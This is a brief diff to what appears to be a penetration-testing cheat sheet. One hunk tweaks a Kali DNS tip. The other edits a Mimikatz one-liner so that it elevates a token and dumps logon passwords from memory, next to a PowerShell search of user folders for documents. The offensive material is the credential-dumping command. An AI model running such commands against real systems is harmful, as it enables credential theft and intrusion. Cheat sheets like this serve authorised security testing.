@@ -1,4 +1,4 @@
-if DNS hangs on kali,use this tofix
+****if DNS hangs on kali,use this tofix
 ```
 service networking restart
 ```
@@ -3487,7 +3487,7 @@ Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx, *.
 
 Mimikatz one-liner
 ```
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
 ```
 
 Powershell one liner with powercat
